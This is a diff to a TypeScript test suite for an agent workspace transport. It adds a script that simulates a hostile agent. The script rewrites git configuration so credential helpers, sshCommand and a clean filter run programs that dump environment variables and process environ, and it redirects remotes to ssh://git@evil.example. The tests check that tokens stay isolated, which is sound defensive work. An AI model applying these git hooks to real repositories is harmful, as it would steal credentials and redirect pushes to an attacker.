@@ -110,14 +110,17 @@ interface LocalRuntime extends AgentRuntime<{ extraEnvVars?: Record<string, stri
  * container entrypoint would, mapping the sandbox result directory to a host
  * directory for the runtime file API.
  */
-function localRuntime(f: Fixture): LocalRuntime {
+function localRuntime(f: Fixture, setup: { pathPrefix?: string } = {}): LocalRuntime {
+    const tmp = path.join(f.root, 'tmp');
+    fs.mkdirSync(tmp, { recursive: true });
     const runtime: LocalRuntime = {
         kind: 'local', started: [], released: 0,
         capabilities: { supportsBindMounts: false, supportsRestrictedNetwork: false, supportsMcpPrivateNetwork: false, reattach: false, workspaceTransports: ['clone'] },
         start(spec, options = {}) {
             runtime.started.push({ spec, extraEnvVars: options.extraEnvVars });
             const clone = spec.workspace.clone!;
-            const env: Record<string, string> = { PATH: process.env.PATH ?? '/usr/bin:/bin', HOME: f.root };
+            const systemPath = process.env.PATH ?? '/usr/bin:/bin';
+            const env: Record<string, string> = { PATH: setup.pathPrefix ? `${setup.pathPrefix}:${systemPath}` : systemPath, HOME: f.root, TMPDIR: tmp };
             for (const variable of [...spec.env].sort((a, b) => a.order - b.order)) {
                 const value = variable.value ?? options.extraEnvVars?.[variable.name];
                 if (value !== undefined) env[variable.name] = value;
@@ -307,4 +310,86 @@ test('a read-only clone gets a read token and returns nothing', async () => {
     assert.equal(runtime.started[0].spec.workspace.clone!.resultRef, undefined);
     assert.equal(git(f.worktree, 'status', '--porcelain'), '');
     assert.equal(remoteRunRefs(f), '');
+});
+
+/**
+ * A hostile agent: rewrites the workspace's git configuration (and its global
+ * one) so any git command run there would execute its programs, and records
+ * what those programs see.
+ */
+const HOSTILE_AGENT_SCRIPT = `#!/bin/bash
+set -e
+evidence="$HOSTILE_EVIDENCE"
+cat > "$evidence/steal.sh" <<'STEAL'
+#!/bin/bash
+env > "$HOSTILE_EVIDENCE/ssh-command.env"
+exit 1
+STEAL
+cat > "$evidence/filter.sh" <<'FILTER'
+#!/bin/bash
+{ echo "USER=\${USER:-}"; env; cat /proc/$PPID/environ 2>/dev/null | tr '\\0' '\\n'; } >> "$HOSTILE_EVIDENCE/clean-filter.env"
+cat
+FILTER
+chmod +x "$evidence/steal.sh" "$evidence/filter.sh"
+for scope in --local --global; do
+    git config $scope core.sshCommand "$evidence/steal.sh"
+    git config $scope url.ssh://git@evil.example/.insteadOf "$PROPR_WORKSPACE_CLONE_REMOTE"
+    git config $scope url.ssh://git@evil.example/.pushInsteadOf "$PROPR_WORKSPACE_CLONE_REMOTE"
+    git config $scope credential.helper "!$evidence/steal.sh"
+done
+git remote set-url origin ssh://git@evil.example/acme/widgets.git
+git remote set-url --push origin ssh://git@evil.example/acme/widgets.git
+git config filter.hostile.clean "$evidence/filter.sh"
+git config filter.hostile.required true
+echo '*.txt filter=hostile' > .gitattributes
+echo hostile > a.txt
+`;
+
+function hostileRun(f: Fixture): { spec: AgentRunSpec; evidence: string } {
+    const evidence = path.join(f.root, 'evidence');
+    fs.mkdirSync(evidence);
+    const agent = path.join(f.root, 'hostile.sh');
+    write(agent, HOSTILE_AGENT_SCRIPT, 0o755);
+    const spec = runSpec(f, { env: { HOSTILE_EVIDENCE: evidence } });
+    spec.repoSetup!.providerEntrypoint = agent;
+    return { spec, evidence };
+}
+
+function assertCredentialIsolated(f: Fixture, evidence: string, runtime: LocalRuntime): void {
+    assert.ok(!fs.existsSync(path.join(evidence, 'ssh-command.env')), 'agent-configured ssh command or credential helper never runs');
+    const authHeader = Buffer.from(`x-access-token:${TOKEN}`).toString('base64');
+    const seenByFilter = fs.readFileSync(path.join(evidence, 'clean-filter.env'), 'utf8');
+    assert.ok(!seenByFilter.includes(TOKEN) && !seenByFilter.includes(authHeader), 'agent clean filter never sees the credential');
+    assert.ok(!seenByFilter.includes('extraheader'), 'agent clean filter never sees the transport git configuration');
+    assert.match(fs.readFileSync(path.join(f.resultDir, 'status'), 'utf8'), /^pushed [0-9a-f]{40}\n$/, 'the result reaches the fixed remote');
+    assert.equal(fs.readFileSync(path.join(f.worktree, 'a.txt'), 'utf8'), 'hostile\n');
+    assert.deepEqual(f.revoked, [TOKEN]);
+    assert.equal(runtime.released, 1);
+    assert.deepEqual(fs.readdirSync(path.join(f.root, 'tmp')), [], 'the private transport repository and stage are removed');
+}
+
+test('agent-controlled git configuration cannot select programs or URLs for credentialed transport operations', async () => {
+    const f = fixture();
+    const runtime = localRuntime(f);
+    const { spec, evidence } = hostileRun(f);
+    const result = await runWithWorkspaceTransport(runtime, spec, {}, { transport: f.transport });
+    assert.equal(result.exitCode, 0, result.stderr);
+    assertCredentialIsolated(f, evidence, runtime);
+});
+
+test('a privileged wrapper snapshots the workspace as the agent user, so agent filters run unprivileged', async () => {
+    const f = fixture();
+    // Simulate a root wrapper with an unprivileged node user: `id` reports root, `su-exec` records the drop.
+    const bin = path.join(f.root, 'bin');
+    const drops = path.join(f.root, 'su-exec.log');
+    write(path.join(bin, 'id'), '#!/bin/bash\ncase "$*" in\n  -u) echo 0 ;;\n  node) echo "uid=1000(node)" ;;\n  "-u node") echo 1000 ;;\n  *) exec /usr/bin/id "$@" ;;\nesac\n', 0o755);
+    write(path.join(bin, 'su-exec'), `#!/bin/bash\nprintf '%s\\n' "$*" >> ${JSON.stringify(drops)}\nshift\nexec "$@"\n`, 0o755);
+    write(path.join(bin, 'chown'), '#!/bin/bash\nexit 0\n', 0o755);
+    const runtime = localRuntime(f, { pathPrefix: bin });
+    const { spec, evidence } = hostileRun(f);
+    const result = await runWithWorkspaceTransport(runtime, spec, {}, { transport: f.transport });
+    assert.equal(result.exitCode, 0, result.stderr);
+    assert.match(fs.readFileSync(drops, 'utf8'), /^node env HOME=\/home\/node USER=node LOGNAME=node \/bin\/bash -c [^]*\n propr-snapshot \//);
+    assert.match(fs.readFileSync(path.join(evidence, 'clean-filter.env'), 'utf8'), /^USER=node$/m, 'the clean filter ran as the agent user');
+    assertCredentialIsolated(f, evidence, runtime);
 });
